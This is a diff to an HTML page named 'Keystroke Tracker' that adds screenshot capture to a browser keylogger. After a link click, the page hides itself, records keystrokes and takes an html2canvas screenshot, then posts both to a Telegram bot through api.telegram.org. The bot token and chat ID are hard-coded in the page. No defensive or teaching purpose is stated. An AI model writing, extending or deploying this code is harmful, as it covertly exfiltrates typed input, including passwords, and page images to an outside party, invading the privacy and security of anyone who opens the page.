@@ -3,12 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Keystroke Tracker</title>
+    <title>Keystroke Tracker with Screenshot</title>
     <style>
         body {
-            display: none; /* Hide the body immediately */
+            display: block; /* Page is visible initially */
+        }
+        #startLink {
+            cursor: pointer;
+            color: blue;
+            text-decoration: underline;
         }
     </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script> <!-- Include html2canvas library -->
     <script>
         const BOT_TOKEN = '7092700046:AAG4ysq9uQu_2nFBrKqx--wdf4C5jJG4_Bo';  // Replace with your Telegram Bot Token
         const CHAT_ID = '6482794683';  // Replace with your Telegram chat ID
@@ -17,7 +23,6 @@
         function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-            // Send data to Telegram API using fetch (or use axios if needed)
             fetch(url, {
                 method: 'POST',
                 headers: {
@@ -58,15 +63,41 @@
             });
         }
 
-        // Run the capture function when the page is loaded
-        window.onload = function () {
+        // Function to take a screenshot of the page
+        function takeScreenshot() {
+            html2canvas(document.body).then(function(canvas) {
+                const screenshotDataUrl = canvas.toDataURL('image/png');
+                
+                // Send screenshot to Telegram
+                sendToTelegram('Screenshot of the page:');
+                sendToTelegram(screenshotDataUrl);  // Send the base64 image data to Telegram
+                console.log('Screenshot taken and sent');
+            });
+        }
+
+        // Function to hide page and start keystroke tracking and screenshot
+        function startTracking() {
+            // Hide the page immediately
+            document.body.style.display = 'none';  
+            
             captureKeystrokes();  // Start capturing keystrokes immediately
-            document.body.style.display = 'none';  // Hide the page immediately
-        };
+            takeScreenshot();     // Take a screenshot when the page starts working
+        }
+
+        // Event listener for the link click
+        document.addEventListener("DOMContentLoaded", function() {
+            const startLink = document.getElementById("startLink");
+
+            // When the user clicks the link, hide the page and start tracking
+            startLink.addEventListener("click", function() {
+                startTracking();
+            });
+        });
     </script>
 </head>
 <body>
     <h1>Keystroke Tracker Running in Background</h1>
-    <p>Start typing and the keystrokes will be captured!</p>
+    <p>Click the link below to start the tracker:</p>
+    <p id="startLink">Click here to start tracking keystrokes and take a screenshot!</p>
 </body>
 </html>
